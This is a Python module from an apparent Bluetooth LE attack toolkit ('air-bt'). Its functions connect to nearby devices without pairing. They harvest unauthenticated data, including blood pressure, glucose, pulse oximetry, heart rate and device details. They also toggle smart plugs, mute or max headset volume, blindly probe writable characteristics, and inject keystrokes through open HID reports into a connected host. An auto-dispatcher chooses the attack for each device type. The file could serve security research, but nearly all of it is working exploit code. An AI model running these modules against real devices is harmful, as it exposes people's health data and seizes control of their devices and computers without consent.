"""
air-bt — PoC exploit / interaction modules for specific device classes.
Created by InnerFireZ — https://github.com/InnerFireZ/air-bt

Uses dev.services / dev.all_characteristics() (populated by enumerate_gatt)
instead of client.services — avoids "Service Discovery not performed" in bleak 3.x.

Modules:
  poc_generic_dump    - Read all open chars + subscribe all notifications
  poc_audio_device    - Audio/headset: info dump, notify stream, volume control
  poc_hid_injection   - HID keyboard injection on unauth HID devices
  poc_iot_sensor      - Sensors: temp, humidity, HR, pressure, battery
  poc_smart_plug      - Smart plugs/relays: on/off/status
  poc_fitness_tracker - Fitness bands: steps, HR, battery, sync time
  poc_health_monitor  - Health: BP, glucose, pulse oximeter
  poc_write_probe     - Systematic write probe on all open chars
  run_best_poc        - Auto-dispatcher based on capabilities/flags
"""

import asyncio
import logging
import struct
from datetime import datetime

from bleak import BleakClient, BleakError
from models import BTDevice, GATTCharacteristic
from scanner.writer import WriteResult

log = logging.getLogger("air-bt.poc")

CONNECT_TIMEOUT = 12.0

# ── Standard GATT UUIDs ───────────────────────────────────────────────────────
U_BATTERY        = "00002a19-0000-1000-8000-00805f9b34fb"
U_TEMPERATURE    = "00002a6e-0000-1000-8000-00805f9b34fb"
U_HUMIDITY       = "00002a6f-0000-1000-8000-00805f9b34fb"
U_PRESSURE       = "00002a6d-0000-1000-8000-00805f9b34fb"
U_HEART_RATE     = "00002a37-0000-1000-8000-00805f9b34fb"
U_BODY_LOCATION  = "00002a38-0000-1000-8000-00805f9b34fb"
U_STEPS_RSC      = "00002a53-0000-1000-8000-00805f9b34fb"
U_MANUFACTURER   = "00002a29-0000-1000-8000-00805f9b34fb"
U_MODEL          = "00002a24-0000-1000-8000-00805f9b34fb"
U_FIRMWARE       = "00002a26-0000-1000-8000-00805f9b34fb"
U_SERIAL         = "00002a25-0000-1000-8000-00805f9b34fb"
U_HARDWARE       = "00002a27-0000-1000-8000-00805f9b34fb"
U_SOFTWARE       = "00002a28-0000-1000-8000-00805f9b34fb"
U_DEVICE_NAME    = "00002a00-0000-1000-8000-00805f9b34fb"
U_APPEARANCE     = "00002a01-0000-1000-8000-00805f9b34fb"
U_SYSTEM_ID      = "00002a23-0000-1000-8000-00805f9b34fb"
U_HID_REPORT     = "00002a4d-0000-1000-8000-00805f9b34fb"
U_HID_REPORT_MAP = "00002a4b-0000-1000-8000-00805f9b34fb"
U_HID_CONTROL    = "00002a4c-0000-1000-8000-00805f9b34fb"
U_BLOOD_PRESSURE = "00002a35-0000-1000-8000-00805f9b34fb"
U_PLX_SPOT       = "00002a5e-0000-1000-8000-00805f9b34fb"
U_GLUCOSE        = "00002a18-0000-1000-8000-00805f9b34fb"
U_WEIGHT         = "00002a9d-0000-1000-8000-00805f9b34fb"
U_ELEVATION      = "00002a6c-0000-1000-8000-00805f9b34fb"
U_CURRENT_TIME   = "00002a2b-0000-1000-8000-00805f9b34fb"


# ── Helpers ───────────────────────────────────────────────────────────────────

def _log(log_cb, msg: str):
    log.info(msg)
    if log_cb:
        log_cb(msg)


def _decode(data: bytes) -> str:
    """Try UTF-8 decode, strip nulls; fall back to hex."""
    try:
        s = data.decode("utf-8").strip().rstrip("\x00")
        if s and s.isprintable():
            return f'"{s}"'
    except Exception:
        pass
    if len(data) == 1:
        return str(data[0])
    return data.hex()


def _find_char(dev: BTDevice, uuid: str) -> GATTCharacteristic | None:
    """Find a characteristic in the already-enumerated dev.services."""
    uuid_l = uuid.lower()
    for c in dev.all_characteristics():
        if c.uuid.lower() == uuid_l:
            return c
    return None


def _open_chars(dev: BTDevice, prop: str) -> list[GATTCharacteristic]:
    """Return chars with a given property that are accessible without auth (no dupes)."""
    seen = set()
    out = []
    for c in dev.all_characteristics():
        if c.uuid in seen:
            continue
        if prop in c.properties:
            if prop in ("write", "write-without-response"):
                if c.writable_without_auth:
                    seen.add(c.uuid)
                    out.append(c)
            elif prop == "read":
                if c.readable_without_auth:
                    seen.add(c.uuid)
                    out.append(c)
            elif prop in ("notify", "indicate"):
                if c.notifiable_without_auth:
                    seen.add(c.uuid)
                    out.append(c)
    return out


async def _read(client: BleakClient, char: GATTCharacteristic, timeout=3.0) -> bytes | None:
    try:
        val = await asyncio.wait_for(client.read_gatt_char(char.handle), timeout=timeout)
        return bytes(val)
    except Exception:
        return None


async def _write(client: BleakClient, char: GATTCharacteristic, data: bytes, timeout=3.0) -> bool:
    try:
        resp = "write-without-response" not in char.properties
        await asyncio.wait_for(
            client.write_gatt_char(char.handle, data, response=resp),
            timeout=timeout,
        )
        return True
    except Exception:
        return False


def _make_result(dev, char_uuid, payload=b"", success=True, response=None, error=None):
    return WriteResult(
        mac=dev.mac, char_uuid=char_uuid, payload=payload,
        success=success, response=response, error=error,
    )


# ── Generic dump ──────────────────────────────────────────────────────────────

async def poc_generic_dump(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """Read all open readable chars + subscribe all notifiable chars."""
    results = []
    readable = _open_chars(dev, "read")
    notifiable = _open_chars(dev, "notify") + _open_chars(dev, "indicate")

    if not readable and not notifiable:
        _log(log_cb, f"[DUMP] No open readable/notifiable chars on {dev.mac}")
        return []

    _log(log_cb, f"[DUMP] {dev.mac} ({dev.name}) — {len(readable)} readable, {len(notifiable)} notifiable")

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, f"[DUMP] ✗ Connection failed")
                return []

            # Read all open chars
            for char in readable:
                val = await _read(client, char)
                if val is not None:
                    decoded = _decode(val)
                    _log(log_cb, f"[DUMP]   READ  {char.description or char.uuid} → {decoded}")
                    results.append(_make_result(dev, char.uuid, response=val))

            # Subscribe to all notifiable chars for 15s
            if notifiable:
                _log(log_cb, f"[DUMP]   Subscribing to {len(notifiable)} notify chars (15s) ...")

                def make_handler(c):
                    def handler(_, data):
                        decoded = _decode(bytes(data))
                        _log(log_cb, f"[DUMP]   NOTIFY {c.description or c.uuid} ← {decoded}")
                        results.append(_make_result(dev, c.uuid, response=bytes(data)))
                    return handler

                subscribed = []
                for char in notifiable:
                    try:
                        await client.start_notify(char.handle, make_handler(char))
                        subscribed.append(char)
                    except Exception as e:
                        _log(log_cb, f"[DUMP]   ✗ subscribe {char.uuid}: {e}")

                await asyncio.sleep(15.0)
                for char in subscribed:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            _log(log_cb, f"[DUMP] ✓ Done — {len(results)} values captured")

    except Exception as e:
        _log(log_cb, f"[DUMP] ✗ {type(e).__name__}: {e}")

    return results


# ── Device info reader (shared) ───────────────────────────────────────────────

async def _read_device_info(dev: BTDevice, client: BleakClient, log_cb) -> list[WriteResult]:
    results = []
    info_map = {
        "Manufacturer":  U_MANUFACTURER,
        "Model":         U_MODEL,
        "Firmware":      U_FIRMWARE,
        "Hardware":      U_HARDWARE,
        "Software":      U_SOFTWARE,
        "Serial":        U_SERIAL,
        "System ID":     U_SYSTEM_ID,
        "Battery %":     U_BATTERY,
        "Temperature":   U_TEMPERATURE,
        "Appearance":    U_APPEARANCE,
    }
    for label, uuid in info_map.items():
        char = _find_char(dev, uuid)
        if char is None:
            continue
        val = await _read(client, char)
        if val is None:
            continue

        if label == "Battery %" and val:
            decoded = f"{val[0]}%"
            dev.battery = val[0]
        elif label == "Temperature" and len(val) >= 2:
            t = struct.unpack_from("<h", val)[0] / 100.0
            decoded = f"{t:.1f}°C"
            dev.temperature = t
        elif label == "Appearance" and len(val) >= 2:
            code = struct.unpack_from("<H", val)[0]
            decoded = f"0x{code:04X}"
        else:
            decoded = _decode(val)
            if label == "Manufacturer":
                dev.manufacturer_name = decoded.strip('"')
            elif label == "Model":
                dev.model_number = decoded.strip('"')
            elif label == "Firmware":
                dev.firmware = decoded.strip('"')

        _log(log_cb, f"   {label}: {decoded}")
        results.append(_make_result(dev, uuid, response=val))
    return results


# ── Audio device PoC ──────────────────────────────────────────────────────────

async def poc_audio_device(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Audio/headset PoC:
      1. Dump device info (manufacturer, model, firmware, battery)
      2. Read all open characteristics
      3. Subscribe to all notifiable chars — captures volume events, playback state
      4. Attempt volume mute via writable chars
    """
    results = []
    _log(log_cb, f"[AUDIO] PoC on {dev.mac} ({dev.name})")

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[AUDIO] ✗ Connection failed")
                return []
            _log(log_cb, "[AUDIO] ✓ Connected")

            # 1. Device info
            _log(log_cb, "[AUDIO] ► Device info:")
            results += await _read_device_info(dev, client, log_cb)

            # 2. Read all open chars not already read above
            known_uuids = {U_MANUFACTURER, U_MODEL, U_FIRMWARE, U_HARDWARE,
                           U_SOFTWARE, U_SERIAL, U_SYSTEM_ID, U_BATTERY,
                           U_TEMPERATURE, U_APPEARANCE}
            _log(log_cb, "[AUDIO] ► Open readable chars:")
            for char in _open_chars(dev, "read"):
                if char.uuid.lower() in known_uuids:
                    continue
                val = await _read(client, char)
                if val:
                    _log(log_cb, f"   {char.description or char.uuid} → {_decode(val)}")
                    results.append(_make_result(dev, char.uuid, response=val))

            # 3. Subscribe all notifiable — capture live audio events
            notifiable = _open_chars(dev, "notify") + _open_chars(dev, "indicate")
            if notifiable:
                _log(log_cb, f"[AUDIO] ► Subscribing to {len(notifiable)} notify chars (10s) ...")
                notified = []

                def make_handler(c):
                    def handler(_, data):
                        decoded = _decode(bytes(data))
                        _log(log_cb, f"[AUDIO]   NOTIFY {c.description or c.uuid} ← {decoded}")
                        notified.append(_make_result(dev, c.uuid, response=bytes(data)))
                    return handler

                subscribed = []
                for char in notifiable:
                    try:
                        await client.start_notify(char.handle, make_handler(char))
                        subscribed.append(char)
                    except Exception as e:
                        _log(log_cb, f"[AUDIO]   ✗ {char.uuid}: {e}")

                await asyncio.sleep(10.0)
                results.extend(notified)
                for char in subscribed:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            # 4. Try volume mute on writable chars
            _log(log_cb, "[AUDIO] ► Attempting volume control writes ...")
            for char in _open_chars(dev, "write") + _open_chars(dev, "write-without-response"):
                for label, data in [("Mute", bytes([0x06])), ("Vol=0", bytes([0x00])),
                                     ("Vol=max", bytes([0xff]))]:
                    ok = await _write(client, char, data)
                    _log(log_cb, f"[AUDIO]   WRITE {label} → {char.description or char.uuid}: {'✓' if ok else '✗'}")
                    if ok:
                        results.append(_make_result(dev, char.uuid, payload=data))
                    await asyncio.sleep(0.4)

            _log(log_cb, f"[AUDIO] ✓ Done — {len(results)} interactions")

    except Exception as e:
        _log(log_cb, f"[AUDIO] ✗ {type(e).__name__}: {e}")

    return results


# ── IoT Sensor PoC ────────────────────────────────────────────────────────────

async def poc_iot_sensor(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Environmental/health sensor PoC:
      - Reads temperature, humidity, pressure, heart rate, SpO2, steps, battery
      - Subscribes to all sensor notifications for 20s (live stream)
      - Dumps all other readable values
    """
    results = []
    _log(log_cb, f"[SENSOR] PoC on {dev.mac} ({dev.name})")

    sensor_map = {
        "Temperature":  (U_TEMPERATURE,   lambda v: f"{struct.unpack_from('<h',v)[0]/100:.1f}°C" if len(v)>=2 else v.hex()),
        "Humidity":     (U_HUMIDITY,       lambda v: f"{struct.unpack_from('<H',v)[0]/100:.1f}%" if len(v)>=2 else v.hex()),
        "Pressure":     (U_PRESSURE,       lambda v: f"{struct.unpack_from('<I',v)[0]/10:.1f} Pa" if len(v)>=4 else v.hex()),
        "Heart Rate":   (U_HEART_RATE,     lambda v: f"{v[1]} bpm" if len(v)>=2 else f"{v[0]} bpm"),
        "Body Location":(U_BODY_LOCATION,  lambda v: (["Other","Chest","Wrist","Finger","Hand","Ear Lobe","Foot"][v[0]] if v and v[0] < 7 else "?") if v else "?"),
        "SpO2":         (U_PLX_SPOT,       lambda v: v.hex()),
        "Steps":        (U_STEPS_RSC,      lambda v: v.hex()),
        "Weight":       (U_WEIGHT,         lambda v: f"{struct.unpack_from('<H',v,1)[0]*0.005:.2f} kg" if len(v)>=3 else v.hex()),
        "Elevation":    (U_ELEVATION,      lambda v: f"{struct.unpack_from('<i',v)[0]*0.01:.1f} m" if len(v)>=4 else v.hex()),
        "Battery":      (U_BATTERY,        lambda v: f"{v[0]}%"),
    }

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[SENSOR] ✗ Connection failed")
                return []
            _log(log_cb, "[SENSOR] ✓ Connected")

            # Device info
            _log(log_cb, "[SENSOR] ► Device info:")
            results += await _read_device_info(dev, client, log_cb)

            # Read sensor values
            _log(log_cb, "[SENSOR] ► Sensor readings:")
            for label, (uuid, decoder) in sensor_map.items():
                char = _find_char(dev, uuid)
                if char is None:
                    continue
                val = await _read(client, char)
                if val:
                    try:
                        decoded = decoder(val)
                    except Exception:
                        decoded = val.hex()
                    _log(log_cb, f"[SENSOR]   {label}: {decoded}")
                    results.append(_make_result(dev, uuid, response=val))

            # Read all other open chars
            _log(log_cb, "[SENSOR] ► Other open chars:")
            known = {uuid for _, (uuid, _) in sensor_map.items()}
            for char in _open_chars(dev, "read"):
                if char.uuid.lower() in known:
                    continue
                val = await _read(client, char)
                if val:
                    _log(log_cb, f"[SENSOR]   {char.description or char.uuid} → {_decode(val)}")
                    results.append(_make_result(dev, char.uuid, response=val))

            # Live notification stream
            notifiable = _open_chars(dev, "notify") + _open_chars(dev, "indicate")
            if notifiable:
                _log(log_cb, f"[SENSOR] ► Live stream ({len(notifiable)} chars, 20s) ...")
                notified = []

                def make_handler(c, decoder=None):
                    def handler(_, data):
                        raw = bytes(data)
                        try:
                            v = decoder(raw) if decoder else _decode(raw)
                        except Exception:
                            v = raw.hex()
                        _log(log_cb, f"[SENSOR]   LIVE {c.description or c.uuid} ← {v}")
                        notified.append(_make_result(dev, c.uuid, response=raw))
                    return handler

                subscribed = []
                for char in notifiable:
                    uuid_l = char.uuid.lower()
                    decoder = next((d for _, (u, d) in sensor_map.items() if u == uuid_l), None)
                    try:
                        await client.start_notify(char.handle, make_handler(char, decoder))
                        subscribed.append(char)
                    except Exception as e:
                        _log(log_cb, f"[SENSOR]   ✗ {char.uuid}: {e}")

                await asyncio.sleep(20.0)
                results.extend(notified)
                for char in subscribed:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            _log(log_cb, f"[SENSOR] ✓ Done — {len(results)} values captured")

    except Exception as e:
        _log(log_cb, f"[SENSOR] ✗ {type(e).__name__}: {e}")

    return results


# ── Smart plug / relay PoC ────────────────────────────────────────────────────

async def poc_smart_plug(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Smart plug/relay PoC:
      - Read device info and state
      - Toggle ON → OFF → ON to demonstrate control
    """
    results = []
    _log(log_cb, f"[PLUG] PoC on {dev.mac} ({dev.name})")

    # Common commands for generic relay modules and Tuya-based plugs
    sequences = [
        # Generic relay: cc0103 / cc0104
        ("Generic ON",  bytes.fromhex("cc0103330033")),
        ("Generic OFF", bytes.fromhex("cc0104330034")),
        ("Generic ON",  bytes.fromhex("cc0103330033")),
        # Tuya style
        ("Tuya ON",     bytes.fromhex("55aa000100000001")),
        # Simple 0x01 / 0x00
        ("Simple ON",   bytes([0x01])),
        ("Simple OFF",  bytes([0x00])),
        ("Simple ON",   bytes([0x01])),
    ]

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[PLUG] ✗ Connection failed")
                return []
            _log(log_cb, "[PLUG] ✓ Connected")

            _log(log_cb, "[PLUG] ► Device info:")
            results += await _read_device_info(dev, client, log_cb)

            writable = _open_chars(dev, "write") + _open_chars(dev, "write-without-response")
            if not writable:
                _log(log_cb, "[PLUG] No open writable chars")
                return results

            _log(log_cb, f"[PLUG] ► Toggling via {len(writable)} writable chars ...")
            for char in writable[:3]:
                for label, cmd in sequences:
                    ok = await _write(client, char, cmd)
                    _log(log_cb, f"[PLUG]   {label} → {char.description or char.uuid}: {'✓' if ok else '✗'}")
                    if ok:
                        results.append(_make_result(dev, char.uuid, payload=cmd))
                    await asyncio.sleep(0.5)

            _log(log_cb, f"[PLUG] ✓ Done — {len(results)} commands sent")

    except Exception as e:
        _log(log_cb, f"[PLUG] ✗ {type(e).__name__}: {e}")

    return results


# ── Fitness tracker PoC ───────────────────────────────────────────────────────

async def poc_fitness_tracker(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Fitness band PoC:
      - Read battery, steps, HR, device info
      - Try to sync time (common command on Chinese bands)
      - Subscribe HR + step notifications
    """
    results = []
    _log(log_cb, f"[FITNESS] PoC on {dev.mac} ({dev.name})")

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[FITNESS] ✗ Connection failed")
                return []
            _log(log_cb, "[FITNESS] ✓ Connected")

            _log(log_cb, "[FITNESS] ► Device info:")
            results += await _read_device_info(dev, client, log_cb)

            # Read all open chars
            _log(log_cb, "[FITNESS] ► Reading all open chars:")
            for char in _open_chars(dev, "read"):
                val = await _read(client, char)
                if val:
                    _log(log_cb, f"[FITNESS]   {char.description or char.uuid} → {_decode(val)}")
                    results.append(_make_result(dev, char.uuid, response=val))

            # Try time sync (common on ID115 clones): write current epoch to FFF3/FFF5
            import time
            epoch = int(time.time())
            time_cmd = struct.pack("<I", epoch)
            _log(log_cb, f"[FITNESS] ► Trying time sync (epoch={epoch}) ...")
            for char in _open_chars(dev, "write") + _open_chars(dev, "write-without-response"):
                ok = await _write(client, char, time_cmd)
                _log(log_cb, f"[FITNESS]   Time sync → {char.description or char.uuid}: {'✓' if ok else '✗'}")
                if ok:
                    results.append(_make_result(dev, char.uuid, payload=time_cmd))

            # HR + step notifications
            notifiable = _open_chars(dev, "notify") + _open_chars(dev, "indicate")
            if notifiable:
                _log(log_cb, f"[FITNESS] ► Live HR/step stream ({len(notifiable)} chars, 15s) ...")
                notified = []

                def make_handler(c):
                    def handler(_, data):
                        _log(log_cb, f"[FITNESS]   LIVE {c.description or c.uuid} ← {_decode(bytes(data))}")
                        notified.append(_make_result(dev, c.uuid, response=bytes(data)))
                    return handler

                subscribed = []
                for char in notifiable:
                    try:
                        await client.start_notify(char.handle, make_handler(char))
                        subscribed.append(char)
                    except Exception:
                        pass

                await asyncio.sleep(15.0)
                results.extend(notified)
                for char in subscribed:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            _log(log_cb, f"[FITNESS] ✓ Done — {len(results)} interactions")

    except Exception as e:
        _log(log_cb, f"[FITNESS] ✗ {type(e).__name__}: {e}")

    return results


# ── Health monitor PoC ───────────────────────────────────────────────────────

async def poc_health_monitor(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """Read blood pressure, glucose, pulse oximeter, weight from health monitor devices."""
    results = []
    _log(log_cb, f"[HEALTH] Health monitor probe on {dev.mac} ({dev.name})")

    HEALTH_UUIDS = [
        (U_BLOOD_PRESSURE, "Blood Pressure"),
        (U_GLUCOSE,        "Glucose"),
        (U_PLX_SPOT,       "Pulse Oximeter"),
        (U_WEIGHT,         "Body Weight"),
        (U_HEART_RATE,     "Heart Rate"),
        (U_BATTERY,        "Battery"),
        (U_MANUFACTURER,   "Manufacturer"),
        (U_MODEL,          "Model"),
        (U_FIRMWARE,       "Firmware"),
    ]

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[HEALTH] ✗ Connection failed")
                return []
            _log(log_cb, "[HEALTH] ✓ Connected")

            for uuid, label in HEALTH_UUIDS:
                char = _find_char(dev, uuid)
                if char is None or not char.readable_without_auth:
                    continue
                raw = await _read(client, char)
                if raw is None:
                    continue
                decoded = _decode(raw)
                _log(log_cb, f"[HEALTH] {label}: {decoded}  (raw={raw.hex()})")
                results.append(_make_result(dev, uuid, payload=raw, success=True))

            # Subscribe to notifiable health chars for 10s
            health_notify = [c for c in dev.all_characteristics()
                             if c.notifiable_without_auth and
                             any(c.uuid == u for u, _ in HEALTH_UUIDS)]
            if health_notify:
                _log(log_cb, f"[HEALTH] Subscribing to {len(health_notify)} health notification char(s) for 10s")
                for char in health_notify:
                    try:
                        await client.start_notify(char.handle,
                            lambda _, d, u=char.uuid: _log(log_cb, f"[HEALTH NOTIFY] {u}: {bytes(d).hex()}"))
                    except Exception as e:
                        _log(log_cb, f"[HEALTH] Subscribe error {char.uuid}: {e}")
                await asyncio.sleep(10.0)
                for char in health_notify:
                    try:
                        await client.stop_notify(char.handle)
                    except Exception:
                        pass

            _log(log_cb, f"[HEALTH] ✓ Done — {len(results)} values read")

    except Exception as e:
        _log(log_cb, f"[HEALTH] ✗ {type(e).__name__}: {e}")

    return results


# ── HID injection PoC ─────────────────────────────────────────────────────────

async def poc_hid_injection(dev: BTDevice, text: str = "air-bt", timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Unauthenticated HID keystroke injection.
    Types `text` + Enter on whatever has focus on the connected host.
    """
    results = []
    _log(log_cb, f"[HID] Injection PoC on {dev.mac} ({dev.name}) — payload: '{text}'")

    _char_to_hid = {
        'a':0x04,'b':0x05,'c':0x06,'d':0x07,'e':0x08,'f':0x09,'g':0x0a,
        'h':0x0b,'i':0x0c,'j':0x0d,'k':0x0e,'l':0x0f,'m':0x10,'n':0x11,
        'o':0x12,'p':0x13,'q':0x14,'r':0x15,'s':0x16,'t':0x17,'u':0x18,
        'v':0x19,'w':0x1a,'x':0x1b,'y':0x1c,'z':0x1d,
        '1':0x1e,'2':0x1f,'3':0x20,'4':0x21,'5':0x22,'6':0x23,
        '7':0x24,'8':0x25,'9':0x26,'0':0x27,
        ' ':0x2c,'-':0x2d,'=':0x2e,'\n':0x28,'\t':0x2b,
        '.':0x37,',':0x36,'/':0x38,';':0x33,"'":0x34,
    }
    _shift_upper = set('ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"<>?')

    def key_report(ch):
        c = ch.lower() if ch in _shift_upper else ch
        code = _char_to_hid.get(c, 0x00)
        mod = 0x02 if ch in _shift_upper else 0x00
        return (bytes([mod, 0x00, code, 0x00, 0x00, 0x00, 0x00, 0x00]),
                bytes([0x00]*8))

    hid_char = _find_char(dev, U_HID_REPORT)
    if hid_char is None or not hid_char.writable_without_auth:
        _log(log_cb, "[HID] No writable HID Report char — searching alternatives ...")
        # Check all writable chars for HID-like UUID
        for c in _open_chars(dev, "write") + _open_chars(dev, "write-without-response"):
            if "2a4" in c.uuid.lower():
                hid_char = c
                break

    if hid_char is None:
        _log(log_cb, "[HID] ✗ No HID Report characteristic found")
        return []

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[HID] ✗ Connection failed")
                return []
            _log(log_cb, f"[HID] ✓ Connected — injecting via {hid_char.uuid}")

            for ch in text + "\n":
                down, up = key_report(ch)
                if await _write(client, hid_char, down):
                    await asyncio.sleep(0.04)
                    await _write(client, hid_char, up)
                    await asyncio.sleep(0.04)
                    _log(log_cb, f"[HID]   → '{ch}'")
                    results.append(_make_result(dev, hid_char.uuid, payload=down))

            _log(log_cb, f"[HID] ✓ Injected {len(results)} keystrokes")

    except Exception as e:
        _log(log_cb, f"[HID] ✗ {type(e).__name__}: {e}")

    return results


# ── Write probe ───────────────────────────────────────────────────────────────

async def poc_write_probe(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """Probe all writable chars with common values — reverse engineering aid."""
    results = []
    probes = [bytes([0x00]), bytes([0x01]), bytes([0xFF]),
              bytes([0x00,0x00]), bytes([0x01,0x00]), bytes([0xFF,0xFF]),
              bytes([0xAA,0x55]), bytes([0x55,0xAA]), bytes([0x00,0x00,0x00,0x00])]

    _log(log_cb, f"[PROBE] Write probe on {dev.mac} ({dev.name})")
    writable = _open_chars(dev, "write") + _open_chars(dev, "write-without-response")

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(log_cb, "[PROBE] ✗ Connection failed")
                return []
            _log(log_cb, f"[PROBE] ✓ Connected — probing {len(writable)} chars")

            for char in writable:
                _log(log_cb, f"[PROBE] ► {char.description or char.uuid}")
                for probe in probes:
                    ok = await _write(client, char, probe)
                    _log(log_cb, f"[PROBE]   {probe.hex()} → {'✓' if ok else '✗'}")
                    if ok:
                        results.append(_make_result(dev, char.uuid, payload=probe))
                    await asyncio.sleep(0.1)

            _log(log_cb, f"[PROBE] ✓ Done — {len(results)} successful writes")

    except Exception as e:
        _log(log_cb, f"[PROBE] ✗ {type(e).__name__}: {e}")

    return results


# ── Auto-dispatcher ───────────────────────────────────────────────────────────

async def run_best_poc(dev: BTDevice, timeout=CONNECT_TIMEOUT, log_cb=None) -> list[WriteResult]:
    """
    Select and run the best PoC based on device capabilities and flags.

    Priority:
      1. HID device with open write       → HID injection
      2. Audio / Headset                  → Audio PoC
      3. Fitness Tracker                  → Fitness PoC
      4. Health Monitor / sensor caps     → Sensor PoC
      5. Smart plug / relay caps          → Smart plug PoC
      6. High notifiable count (≥5)       → Generic dump (data harvest)
      7. Fallback                         → Generic dump + write probe
    """
    caps_lower = " ".join(dev.capabilities).lower()
    flags = dev.sec_flags

    if "hid device" in caps_lower and "OPEN_WRITE" in flags:
        return await poc_hid_injection(dev, text="air-bt poc", timeout=timeout, log_cb=log_cb)

    if "audio" in caps_lower or "headset" in caps_lower:
        return await poc_audio_device(dev, timeout=timeout, log_cb=log_cb)

    if "fitness" in caps_lower:
        return await poc_fitness_tracker(dev, timeout=timeout, log_cb=log_cb)

    if any(k in caps_lower for k in ("health", "sensor", "environment", "thermometer", "glucose", "blood")):
        return await poc_iot_sensor(dev, timeout=timeout, log_cb=log_cb)

    if any(k in caps_lower for k in ("gpio", "io control", "relay", "uart")):
        return await poc_smart_plug(dev, timeout=timeout, log_cb=log_cb)

    if dev.notifiable >= 5:
        return await poc_generic_dump(dev, timeout=timeout, log_cb=log_cb)

    results = await poc_generic_dump(dev, timeout=timeout, log_cb=log_cb)
    if "OPEN_WRITE" in flags:
        results += await poc_write_probe(dev, timeout=timeout, log_cb=log_cb)
    return results
